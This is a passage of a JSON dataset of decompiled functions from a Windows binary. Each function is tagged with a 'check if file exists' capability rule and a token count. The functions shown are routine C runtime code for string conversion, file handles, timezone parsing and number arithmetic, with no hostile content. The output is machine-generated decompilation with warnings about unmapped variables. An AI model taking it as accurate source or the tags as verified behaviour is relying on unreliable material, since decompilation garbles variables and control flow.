iVar1 = iVar1 + 1)\n                {\n                    *(iVar1 + 0x11d + arg_8h_00) = *(iVar1 + 0x442f40);\n                }\n            }\n        }\n        if ((*(unaff_EBP + -0x20) == -1) && (arg_8h_00 != *0x442dfc)) {\n            fcn.0040cfb5(arg_8h_00);\n        }\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004165fe();\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 914
    },
    "00416625": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_2ch_2\n// WARNING: Variable defined which should be unmapped: var_28h_2\n\nvoid __cdecl\nfcn.00416625(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint lpWideCharStr, \n            uint arg_10h, uint noname_21, uint CodePage, uint arg_1ch)\n\n{\n    int16_t *piVar1;\n    int32_t arg_10h_00;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint dwInfoType;\n    uint lpSrcStr;\n    uint cchSrc;\n    uint var_14h;\n    uint var_30h;\n    uint Locale;\n    uint var_28h;\n    uint var_ch;\n    uint var_18h;\n    uint var_18h_2;\n    uint var_4h;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint var_34h_2;\n    uchar *var_30h_3;\n    uint var_2ch_2;\n    int32_t var_28h_2;\n    uint var_24h_2;\n    uint var_40h;\n    uint lpCharType;\n    uint uStack28;\n    uint var_34h;\n    uint var_30h_2;\n    uint uStack16;\n    uint var_24h;\n    \n    fcn.0040f0bc();\n    if (*0x442ca4 == 0) {\n        uStack16 = 1;\n        var_30h_2 = 0x43b30c;\n        var_34h = 1;\n        uStack28 = 0x41664f;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x78) {\n                *0x442ca4 = 2;\n            }\n        }\n        else {\n            *0x442ca4 = 1;\n        }\n    }\n    if (*0x442ca4 == 1) {\n        uStack16 = *(unaff_EBP + 0x10);\n        var_30h_2 = *(unaff_EBP + 0xc);\n        var_34h = *(unaff_EBP + 8);\n        uStack28 = 0x41668b;\n        (*_sym.imp.KERNEL32.dll_GetStringTypeW)();\n        goto code_r0x00416841;\n    }\n    if ((*0x442ca4 != 2) && (*0x442ca4 != 0)) goto code_r0x00416841;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x2c) = 0;\n    if (*(unaff_EBP + 0x1c) == 0) {\n        *(unaff_EBP + 0x1c) = *0x442bf0;\n    }\n    if (*(unaff_EBP + 0x18) == 0) {\n        *(unaff_EBP + 0x18) = *0x442c00;\n    }\n    uStack16 = 0x4166c1;\n    iVar2 = fcn.00415600(*(unaff_EBP + 0x1c));\n    if ((*(unaff_EBP + 0x18) != iVar2) && (iVar2 != -1)) {\n        *(unaff_EBP + 0x18) = iVar2;\n    }\n    uStack16 = 0;\n    var_30h_2 = 0;\n    var_34h = 0;\n    uStack28 = *(unaff_EBP + 0x10);\n    lpCharType = *(unaff_EBP + 0xc);\n    var_40h = 0;\n    var_24h_2 = *(unaff_EBP + 0x18);\n    var_28h_2 = 0x4166e3;\n    iVar2 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n    *(unaff_EBP + -0x28) = iVar2;\n    if (iVar2 == 0) goto code_r0x00416841;\n    *(unaff_EBP + -4) = 0;\n    var_28h_2 = 0x416703;\n    fcn.0040fc80();\n    *(unaff_EBP + -0x18) = &fcn.00416625::var_24h_2;\n    *(unaff_EBP + -0x24) = &fcn.00416625::var_24h_2;\n    var_2ch_2 = 0;\n    var_34h_2 = 0x416713;\n    var_30h_3 = &fcn.00416625::var_24h_2;\n    var_28h_2 = iVar2;\n    fcn.0040cf50();\n    *(unaff_EBP + -4) = 0xffffffff;\n    if (*(unaff_EBP + -0x24) == 0) {\n        var_2ch_2 = 1;\n        var_30h_3 = 0x416744;\n        var_28h_2 = iVar2;\n        iVar3 = fcn.004130d3(1, iVar2);\n        *(unaff_EBP + -0x24) = iVar3;\n        if (iVar3 == 0) goto code_r0x00416841;\n        *(unaff_EBP + -0x30) = 1;\n    }\n    var_28h_2 = 0;\n    var_2ch_2 = 0;\n    var_34h_2 = *(unaff_EBP + -0x24);\n    uStack60 = *(unaff_EBP + 0x10);\n    uStack64 = *(unaff_EBP + 0xc);\n    uStack68 = 0;\n    uStack72 = *(unaff_EBP + 0x18);\n    var_30h_3 = iVar2;\n    iVar3 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)();\n    if (iVar3 != 0) {\n        *(unaff_EBP + -4) = 1;\n        fcn.0040fc80();\n        *(unaff_EBP + -0x18) = &stack0xffffffb8;\n        *(unaff_EBP + -0x20) = &stack0xffffffb8;\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x20) == 0) {\n            iVar3 = fcn.0040b8de(iVar2 * 2 + 2);\n            *(unaff_EBP + -0x20) = iVar3;\n            if (iVar3 == 0) goto code_r0x00416830;\n            *(unaff_EBP + -0x2c) = 1;\n        }\n        if (*(unaff_EBP + 0x1c) == 0) {\n            *(unaff_EBP + 0x1c) = *0x442bf0;\n        }\n        arg_10h_00 = *(unaff_EBP + 0x10) * 2;\n        iVar3 = *(unaff_EBP + -0x20);\n        piVar1 = arg_10h_00 + iVar3;\n        *piVar1 = -1;\n        piVar1[-1] = -1;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetStringTypeA)\n                          (*(unaff_EBP + 0x1c), *(unaff_EBP + 8), *(unaff_EBP + -0x24), iVar2, iVar3);\n        *(unaff_EBP + -0x34) = uVar4;\n        if ((piVar1[-1] == -1) || (*piVar1 != -1)) {\n            *(unaff_EBP + -0x34) = 0;\n        }\n        else {\n            fcn.0040ada0(*(unaff_EBP + 0x14), *(unaff_EBP + -0x20), arg_10h_00);\n        }\n        if (*(unaff_EBP + -0x2c) != 0) {\n            fcn.0040cfb5(*(unaff_EBP + -0x20));\n        }\n    }\ncode_r0x00416830:\n    if (*(unaff_EBP + -0x30) != 0) {\n        fcn.0040cfb5(*(unaff_EBP + -0x24));\n    }\ncode_r0x00416841:\n    *(unaff_EBP + -0x44) = 0x416849;\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 2094
    },
    "0041747d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0041747d(uint32_t param_1, uint param_2)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint uVar4;\n    \n    if (param_1 < *0x443060) {\n        piVar1 = (param_1 >> 5) * 4 + 0x4430a0;\n        iVar3 = (param_1 & 0x1f) * 0x24;\n        if (*(iVar3 + *piVar1) == -1) {\n            if (*0x4412ec == 1) {\n                if (param_1 == 0) {\n                    uVar4 = 0xfffffff6;\n                }\n                else if (param_1 == 1) {\n                    uVar4 = 0xfffffff5;\n                }\n                else {\n                    if (param_1 != 2) goto code_r0x004174d6;\n                    uVar4 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar4, param_2);\n            }\ncode_r0x004174d6:\n            *(iVar3 + *piVar1) = param_2;\n            return 0;\n        }\n    }\n    puVar2 = fcn.0041296c();\n    *puVar2 = 9;\n    puVar2 = fcn.00412975();\n    *puVar2 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 332
    },
    "004174f9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.004174f9(uint32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    \n    if (param_1 < *0x443060) {\n        piVar1 = (param_1 >> 5) * 4 + 0x4430a0;\n        iVar4 = (param_1 & 0x1f) * 0x24;\n        piVar2 = *piVar1 + iVar4;\n        if (((*(piVar2 + 1) & 1) != 0) && (*piVar2 != -1)) {\n            if (*0x4412ec == 1) {\n                if (param_1 == 0) {\n                    uVar5 = 0xfffffff6;\n                }\n                else if (param_1 == 1) {\n                    uVar5 = 0xfffffff5;\n                }\n                else {\n                    if (param_1 != 2) goto code_r0x00417555;\n                    uVar5 = 0xfffffff4;\n                }\n                (*_sym.imp.KERNEL32.dll_SetStdHandle)(uVar5, 0);\n            }\ncode_r0x00417555:\n            *(iVar4 + *piVar1) = 0xffffffff;\n            return 0;\n        }\n    }\n    puVar3 = fcn.0041296c();\n    *puVar3 = 9;\n    puVar3 = fcn.00412975();\n    *puVar3 = 0;\n    return 0xffffffff;\n}\n",
        "token_count": 359
    },
    "0041767b": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041767b(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43d098, 0x14);\n    *(unaff_EBP + -0x1c) = 0xffffffff;\n    iVar2 = fcn.0040efe8(0xb);\n    if (iVar2 != 0) {\n        fcn.0040f088(0xb);\n        *(unaff_EBP + -4) = 0;\n        for (iVar2 = 0; *(unaff_EBP + -0x24) = iVar2,  iVar2 < 0x40; iVar2 = iVar2 + 1) {\n            puVar4 = *(iVar2 * 4 + 0x4430a0);\n            if (puVar4 == NULL) {\n                puVar4 = fcn.0040b8de(0x480);\n                *(unaff_EBP + -0x20) = puVar4;\n                if (puVar4 != NULL) {\n                    piVar1 = iVar2 * 4 + 0x4430a0;\n                    *piVar1 = puVar4;\n                    *0x443060 = *0x443060 + 0x20;\n                    while (puVar4 < *piVar1 + 0x480) {\n                        *(puVar4 + 1) = 0;\n                        *puVar4 = 0xffffffff;\n                        *(puVar4 + 5) = 10;\n                        puVar4[2] = 0;\n                        puVar4 = puVar4 + 9;\n                        *(unaff_EBP + -0x20) = puVar4;\n                    }\n                    *(unaff_EBP + -0x1c) = iVar2 << 5;\n                    iVar2 = fcn.004175b9(iVar2 << 5);\n                    if (iVar2 == 0) {\n                        *(unaff_EBP + -0x1c) = 0xffffffff;\n                    }\n                }\n                break;\n            }\n            for (; *(unaff_EBP + -0x20) = puVar4,  puVar4 < *(iVar2 * 4 + 0x4430a0) + 0x480; puVar4 = puVar4 + 9) {\n                if ((*(puVar4 + 1) & 1) == 0) {\n                    if (puVar4[2] == 0) {\n                        fcn.0040f088(10);\n                        *(unaff_EBP + -4) = 1;\n                        if (puVar4[2] == 0) {\n                            iVar3 = fcn.004159e1(puVar4 + 3, 4000);\n                            if (iVar3 == 0) {\n                                fcn.0040b52a(unaff_EBP + -0x10, 0xffffffff);\n                                goto code_r0x004177e8;\n                            }\n                            puVar4[2] = puVar4[2] + 1;\n                        }\n                        *(unaff_EBP + -4) = 0;\n                        fcn.00417754();\n                    }\n                    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(puVar4 + 3);\n                    if ((*(puVar4 + 1) & 1) == 0) {\n                        *puVar4 = 0xffffffff;\n                        *(unaff_EBP + -0x1c) = (puVar4 - *(iVar2 * 4 + 0x4430a0)) / 0x24 + iVar2 * 0x20;\n                        break;\n                    }\n                    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(puVar4 + 3);\n                }\n            }\n            if (*(unaff_EBP + -0x1c) != -1) break;\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.004177ee();\n    }\ncode_r0x004177e8:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 969
    },
    "00417b6e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid fcn.00417b6e(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    code *pcVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    char *pcVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0040f0bc(0x43d110, 0x18);\n    *(unaff_EBP + -0x20) = 0;\n    fcn.0040f088(7);\n    *(unaff_EBP + -4) = 0;\n    uVar2 = *0x442c00;\n    *(unaff_EBP + -0x28) = *0x442c00;\n    *0x442d6c = 0;\n    *0x441eac = 0xffffffff;\n    *0x441ea0 = 0xffffffff;\n    pcVar4 = fcn.00419122(0x43d10c);\n    *(unaff_EBP + -0x24) = pcVar4;\n    if ((pcVar4 == NULL) || (*pcVar4 == '\\0')) {\n        if (*0x442d70 != 0) {\n            fcn.0040cfb5(*0x442d70);\n            *0x442d70 = 0;\n        }\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetTimeZoneInformation)(0x442cc0);\n        pcVar3 = _sym.imp.KERNEL32.dll_WideCharToMultiByte;\n        if (iVar5 != -1) {\n            *0x442d6c = 1;\n            *0x441e08 = *0x442cc0 * 0x3c;\n            if (*0x442d06 != 0) {\n                *0x441e08 = *0x441e08 + *0x442d14 * 0x3c;\n            }\n            if ((*0x442d5a == 0) || (*0x442d68 == 0)) {\n                *0x441e0c = 0;\n                *0x441e10 = 0;\n            }\n            else {\n                *0x441e0c = 1;\n                *0x441e10 = (*0x442d68 - *0x442d14) * 0x3c;\n            }\n            iVar5 = (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)\n                              (uVar2, 0, 0x442cc4, 0xffffffff, *0x441e98, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x441e98 = 0;\n            }\n            else {\n                (*0x441e98)[0x3f] = 0;\n            }\n            iVar5 = (*pcVar3)(uVar2, 0, 0x442d18, 0xffffffff, *0x441e9c, 0x3f, 0, unaff_EBP + -0x1c);\n            if ((iVar5 == 0) || (*(unaff_EBP + -0x1c) != 0)) {\n                **0x441e9c = 0;\n            }\n            else {\n                (*0x441e9c)[0x3f] = 0;\n            }\n        }\n    }\n    else {\n        if (*0x442d70 != 0) {\n            iVar5 = fcn.00411e40(pcVar4, *0x442d70);\n            if (iVar5 == 0) goto code_r0x00417d72;\n            if (*0x442d70 != 0) {\n                fcn.0040cfb5(*0x442d70);\n            }\n        }\n        iVar5 = fcn.0040bc50(pcVar4);\n        *0x442d70 = fcn.0040b8de(iVar5 + 1);\n        if (*0x442d70 != 0) {\n            fcn.00411ed0(*0x442d70, pcVar4);\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.00417d89();\n            fcn.004149a0(*0x441e98, pcVar4, 3);\n            (*0x441e98)[3] = 0;\n            pcVar6 = pcVar4 + 3;\n            if (*pcVar6 == '-') {\n                *(unaff_EBP + -0x20) = 1;\n                pcVar6 = pcVar4 + 4;\n            }\n            *0x441e08 = fcn.004182d7(pcVar6);\n            *0x441e08 = *0x441e08 * 0xe10;\n            for (; (cVar1 = *pcVar6,  cVar1 == '+' || (('/' < cVar1 && (cVar1 < ':')))); pcVar6 = pcVar6 + 1) {\n            }\n            if (*pcVar6 == ':') {\n                pcVar6 = pcVar6 + 1;\n                iVar5 = fcn.004182d7(pcVar6);\n                *0x441e08 = *0x441e08 + iVar5 * 0x3c;\n                for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                }\n                if (*pcVar6 == ':') {\n                    pcVar6 = pcVar6 + 1;\n                    iVar5 = fcn.004182d7(pcVar6);\n                    *0x441e08 = *0x441e08 + iVar5;\n                    for (; ('/' < *pcVar6 && (*pcVar6 < ':')); pcVar6 = pcVar6 + 1) {\n                    }\n                }\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                *0x441e08 = -*0x441e08;\n            }\n            *0x441e0c = *pcVar6;\n            if (*0x441e0c == 0) {\n                **0x441e9c = 0;\n            }\n            else {\n                fcn.004149a0(*0x441e9c, pcVar6, 3);\n                (*0x441e9c)[3] = 0;\n            }\n            goto code_r0x00417e10;\n        }\n    }\ncode_r0x00417d72:\n    fcn.0040b52a(unaff_EBP + -0x10, 0xffffffff);\ncode_r0x00417e10:\n    fcn.0040f0f7();\n    return;\n}\n",
        "token_count": 1637
    },
    "004182d7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.004182d7(uint8_t *param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    \n    iVar1 = fcn.0040f262();\n    iVar1 = *(iVar1 + 100);\n    if (iVar1 != *0x44163c) {\n        iVar1 = fcn.0040de06();\n    }\n    while( true ) {\n        if (*(iVar1 + 0x28) < 2) {\n            uVar2 = *(*(iVar1 + 0x48) + *param_1 * 2) & 8;\n        }\n        else {\n            uVar2 = fcn.0041580c(iVar1, *param_1, 8);\n        }\n        if (uVar2 == 0) break;\n        param_1 = param_1 + 1;\n    }\n    uVar2 = *param_1;\n    puVar5 = param_1 + 1;\n    if ((uVar2 == 0x2d) || (uVar3 = uVar2,  uVar2 == 0x2b)) {\n        uVar3 = *puVar5;\n        puVar5 = param_1 + 2;\n    }\n    iVar1 = 0;\n    while( true ) {\n        if ((uVar3 < 0x30) || (0x39 < uVar3)) {\n            iVar4 = -1;\n        }\n        else {\n            iVar4 = uVar3 - 0x30;\n        }\n        if (iVar4 == -1) break;\n        iVar1 = iVar4 + iVar1 * 10;\n        uVar3 = *puVar5;\n        puVar5 = puVar5 + 1;\n    }\n    if (uVar2 == 0x2d) {\n        iVar1 = -iVar1;\n    }\n    return iVar1;\n}\n",
        "token_count": 440
    },
    "004192f5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004192f5(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    int32_t *piVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    int32_t var_28h;\n    uint16_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar3 = arg_ch;\n    var_4h = *0x441350;\n    var_1ch = 0;\n    var_10h._0_1_ = 0;\n    var_10h._1_1_ = 0;\n    var_10h._2_2_ = 0;\n    var_ch._0_2_ = 0;\n    var_ch._2_2_ = 0;\n    var_8h._0_2_ = 0;\n    var_8h._2_1_ = 0;\n    var_8h._3_1_ = 0;\n    uVar6 = *(arg_ch + 10) & 0x7fff;\n    uVar4 = *(arg_8h + 10) & 0x7fff;\n    uVar8 = (*(arg_ch + 10) ^ *(arg_8h + 10)) & 0x8000;\n    uVar2 = uVar6 + uVar4;\n    if (((uVar4 < 0x7fff) && (uVar6 < 0x7fff)) && (uVar2 < 0xbffe)) {\n        if (uVar2 < 0x3fc0) {\ncode_r0x004193a2:\n            arg_8h[2] = 0;\n            arg_8h[1] = 0;\n            *arg_8h = 0;\n            goto code_r0x0041951a;\n        }\n        if (uVar4 == 0) {\n            uVar2 = uVar2 + 1;\n            arg_8h._0_2_ = 0;\n            if ((((arg_8h[2] & 0x7fffffffU) != 0) || (arg_8h[1] != 0)) || (*arg_8h != 0)) goto code_r0x0041938c;\n        }\n        else {\ncode_r0x0041938c:\n            if (((uVar6 == 0) && (uVar2 = uVar2 + 1,  (arg_ch[2] & 0x7fffffffU) == 0)) &&\n               ((arg_ch[1] == 0 && (*arg_ch == 0)))) goto code_r0x004193a2;\n            var_18h = 0;\n            var_14h = &var_ch;\n            arg_ch = 0x5;\n            do {\n                if (0 < arg_ch) {\n                    var_24h = var_18h * 2 + arg_8h;\n                    var_20h = piVar3 + 2;\n                    var_28h = arg_ch;\n                    do {\n                        iVar5 = fcn.0041885c(var_14h[-1], *var_20h * *var_24h, var_14h + -1);\n                        if (iVar5 != 0) {\n                            *var_14h = *var_14h + 1;\n                        }\n                        var_24h = var_24h + 1;\n                        var_20h = var_20h + -2;\n                        var_28h = var_28h + -1;\n                    } while (var_28h != 0);\n                }\n                var_14h = var_14h + 2;\n                var_18h = var_18h + 1;\n                arg_ch = arg_ch + -1;\n            } while (0 < arg_ch);\n            arg_8h._0_2_ = uVar2 + 0xc002;\n            if (arg_8h < 1) {\ncode_r0x00419456:\n                arg_8h._0_2_ = arg_8h - 1;\n                if (arg_8h < 0) {\n                    uVar7 = -arg_8h;\n                    arg_8h._0_2_ = 0;\n                    do {\n                        if ((var_10h & 1) != 0) {\n                            var_1ch = var_1ch + 1;\n                        }\n                        fcn.00418909(&var_10h);\n                        uVar7 = uVar7 - 1;\n                    } while (uVar7 != 0);\n                    if (var_1ch != 0) {\n                        var_10h._0_1_ = var_10h | 1;\n                    }\n                }\n            }\n            else {\n                do {\n                    if ((var_8h._3_1_ & 0x80) != 0) break;\n                    fcn.004188db(&var_10h);\n                    arg_8h._0_2_ = arg_8h - 1;\n                } while (0 < arg_8h);\n                if (arg_8h < 1) goto code_r0x00419456;\n            }\n            if ((0x8000 < CONCAT11(var_10h._1_1_, var_10h)) ||\n               ((CONCAT22(var_10h._2_2_, CONCAT11(var_10h._1_1_, var_10h)) & 0x1ffff) == 0x18000)) {\n                if (CONCAT22(var_ch, var_10h._2_2_) == -1) {\n                    var_10h._2_2_ = 0;\n                    var_ch._0_2_ = 0;\n                    if (CONCAT22(var_8h, var_ch._2_2_) == -1) {\n                        var_ch._2_2_ = 0;\n                        var_8h._0_2_ = 0;\n                        if (CONCAT11(var_8h._3_1_, var_8h._2_1_) == -1) {\n                            arg_8h._0_2_ = arg_8h + 1;\n                            var_8h._2_1_ = 0;\n                            var_8h._3_1_ = 0x80;\n                        }\n                        else {\n                            iVar1 = CONCAT11(var_8h._3_1_, var_8h._2_1_) + 1;\n                            var_8h._2_1_ = iVar1;\n                            var_8h._3_1_ = iVar1 >> 8;\n                        }\n                    }\n                    else {\n                        iVar5 = CONCAT22(var_8h, var_ch._2_2_) + 1;\n                        var_ch._2_2_ = iVar5;\n                        var_8h._0_2_ = iVar5 >> 0x10;\n                    }\n                }\n                else {\n                    iVar5 = CONCAT22(var_ch, var_10h._2_2_) + 1;\n                    var_10h._2_2_ = iVar5;\n                    var_ch._0_2_ = iVar5 >> 0x10;\n                }\n            }\n            if (0x7ffe < arg_8h) goto code_r0x004194ff;\n            *arg_8h = var_10h._2_2_;\n            *(arg_8h + 2) = CONCAT22(var_ch._2_2_, var_ch);\n            *(arg_8h + 6) = CONCAT13(var_8h._3_1_, CONCAT12(var_8h._2_1_, var_8h));\n            arg_8h._0_2_ = arg_8h | uVar8;\n        }\n        *(arg_8h + 10) = arg_8h;\n    }\n    else {\ncode_r0x004194ff:\n        arg_8h[1] = 0;\n        *arg_8h = 0;\n        arg_8h[2] = (-(uVar8 != 0) & 0x80000000) + 0x7fff8000;\n    }\ncode_r0x0041951a:\n    fcn.0040d590();\n    return;\n}\n",
        "token_count": 1904
    },
    "004196a7": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_44h_2\n// WARNING: Variable defined which should be unmapped: var_40h_3\n// WARNING: Variable defined which should be unmapped: var_3ch_3\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_40h_2\n// WARNING: Variable defined which should be unmapped: var_3ch_2\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __cdecl\nfcn.004196a7(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint arg_8h, uint arg_ch, uint lpMultiByteStr, uint cbMultiByte, \n            uint lpString2, uint cchCount2, uint CodePage)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint8_t *puVar4;\n    uint *arg_8h_00;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    uint Locale;\n    uint dwCmpFlags;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint lpCPInfo;\n    uint var_4h_2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_18h_2;\n    uint var_1ch_2;\n    uint var_20h;\n    uint var_4h;\n    uint var_50h;\n    uint var_44h_2;\n    uint var_40h_3;\n    uint var_3ch_3;\n    uint lpString1;\n    uint var_30h_2;\n    uchar auStack48 [2];\n    uint var_2ah;\n    int32_t var_4ch;\n    uint var_40h_2;\n    uint var_3ch_2;\n    uint var_5ch;\n    uint uVar7;\n    \n    uVar7 = 0x40;\n    fcn.0040f0bc();\n    *(unaff_EBP + -0x1c) = *0x441350;\n    iVar6 = 0;\n    if (*0x442d80 == 0) {\n        var_4ch = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CompareStringW)();\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar2 == 0x78) {\n                *0x442d80 = 2;\n            }\n        }\n        else {\n            *0x442d80 = 1;\n        }\n    }\n    if (0 < *(unaff_EBP + 0x14)) {\n        uVar3 = fcn.0041968b();\n        *(unaff_EBP + 0x14) = uVar3;\n    }\n    iVar2 = *(unaff_EBP + 0x1c);\n    if (0 < iVar2) {\n        iVar2 = fcn.0041968b();\n        *(unaff_EBP + 0x1c) = iVar2;\n    }\n    if ((*0x442d80 == 2) || (*0x442d80 == 0)) {\n        *(unaff_EBP + -0x38) = 0;\n        if (*(unaff_EBP + 8) == 0) {\n            *(unaff_EBP + 8) = *0x442bf0;\n        }\n        iVar2 = *(unaff_EBP + 0x20);\n        if (*(unaff_EBP + 0x20) == 0) {\n            iVar2 = *0x442c00;\n        }\n        iVar5 = fcn.00415600(*(unaff_EBP + 8));\n        if (iVar5 == -1) goto code_r0x00419a1a;\n        if (iVar5 != iVar2) {\n            var_4ch = iVar2;\n            iVar6 = fcn.00415643(iVar2, iVar5, *(unaff_EBP + 0x10), unaff_EBP + 0x14, 0, 0, 0x43d1a0, uVar7);\n            if (iVar6 == 0) goto code_r0x00419a1a;\n            var_4ch = iVar2;\n            iVar2 = fcn.00415643(iVar2, iVar5, *(unaff_EBP + 0x18), unaff_EBP + 0x1c, 0, 0, 0x43d1a0, uVar7);\n            *(unaff_EBP + -0x38) = iVar2;\n            if (iVar2 == 0) {\n                fcn.0040cfb5(iVar6);\n                goto code_r0x00419a1a;\n            }\n            *(unaff_EBP + 0x10) = iVar6;\n            *(unaff_EBP + 0x18) = *(unaff_EBP + -0x38);\n        }\n        var_4ch = *(unaff_EBP + 8);\n        (*_sym.imp.KERNEL32.dll_CompareStringA)();\n        if (iVar6 != 0) {\n            fcn.0040cfb5(iVar6);\n            stack0xffffffd4 = 0x419a16;\n            fcn.0040cfb5(*(unaff_EBP + -0x38));\n        }\n        goto code_r0x00419a1a;\n    }\n    if (*0x442d80 != 1) goto code_r0x00419a1a;\n    *(unaff_EBP + -0x3c) = 0;\n    *(unaff_EBP + -0x44) = 0;\n    *(unaff_EBP + -0x40) = 0;\n    if (*(unaff_EBP + 0x20) == 0) {\n        *(unaff_EBP + 0x20) = *0x442c00;\n    }\n    if ((*(unaff_EBP + 0x14) == 0) || (iVar2 == 0)) {\n        if ((*(unaff_EBP + 0x14) == iVar2) ||\n           (((1 < iVar2 || (1 < *(unaff_EBP + 0x14))) || (iVar6 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(),  iVar6 == 0))))\n        goto code_r0x00419a1a;\n        if (0 < *(unaff_EBP + 0x14)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 = unaff_EBP + -0x2a;\n                uVar1 = *(unaff_EBP + -0x2a);\n                while (((uVar1 != 0 && (puVar4[1] != 0)) &&\n                       ((**(unaff_EBP + 0x10) < *puVar4 || (puVar4[1] < **(unaff_EBP + 0x10)))))) {\n                    puVar4 = puVar4 + 2;\n                    uVar1 = *puVar4;\n                }\n            }\n            goto code_r0x00419a1a;\n        }\n        if (0 < *(unaff_EBP + 0x1c)) {\n            if (1 < *(unaff_EBP + -0x30)) {\n                puVar4 